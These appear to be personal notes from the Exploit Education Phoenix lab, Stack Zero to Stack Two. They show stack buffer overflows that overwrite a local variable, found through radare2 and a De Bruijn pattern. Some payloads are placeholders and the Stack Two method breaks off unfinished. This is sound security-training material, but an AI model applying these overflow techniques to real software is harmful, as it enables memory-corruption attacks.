
Exploit Education > Phoenix > Stack Zero

Code Snippet:
locals.changeme = 0;
if (locals.changeme != 0) 
{
  puts("Well done, the 'changeme' variable has been changed!");
}

# r2 -d -A IlYb
# s main; pdf 

Spammed letter "a" until "a"s overwrite variable. 

===Stack One===
Code Snippet:
if (locals.changeme == 0x496c5962)

Used ASCII code to convert hex (0x496c5962) to characters:  = "IlYb"
a*~64 + IlYb. Buffer overflow and overwrite variable with IlYb

Refined version 1.0:
# Using De Bruijn Sequences
ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x41574141, we want 0x496c5962

0x41574141 (Hexadecimal) == AWAA (ASCII)
Replace AWAA in De Bruijn sequence with "IlYb" (Need to reverse because Endianness)

user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one ***bYlI***
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value

Note:
Code Snippet:
# Buffer can only hold 64 characters so buffer overflow achieve using 65 characters. 
char buffer[64];

===Stack Two===

Code Snippet:
ptr = getenv("ExploitEducation");
if (ptr == NULL) 
{
  errx(1, "please set the ExploitEducation environment variable");
}
...
locals.changeme = 0;
strcpy(locals.buffer, ptr);
...
if (locals.changeme == 0x0d0a090a) 
{
  puts("Well done, you have successfully set changeme to the correct value");
}

1) Check where the environment variable (ptr) sits on the stack:
# s main;pdf
0x004006d0      488945f8       mov qword [rbp - local_8h], rax
2) Check where target local variable (locals.changeme) sits on the stack:
# mov dword [rbp - local_10h], 0 == locals.changeme = 0;
# mov eax, dword [rbp - local_10h] == locals.buffer

# Display memory address stored in the rbp register (Base Pointer Register)
$dr rbp
# Calculating memory address of where variable is located:
Memory Address = rbp - local_10h = 0x7fff1234 - 0x10 = 0x7fff1224

"Adjacent Neighbors"
Inspect memory content using the command: px 
"px @rsp" view address at the "Stack Pointer Register" (Top of stack)
3) Change environment variable and add target memory address to overwrite local variable:
# printenv ExploitEducation
# export ExploitEducation=NOT_NULL
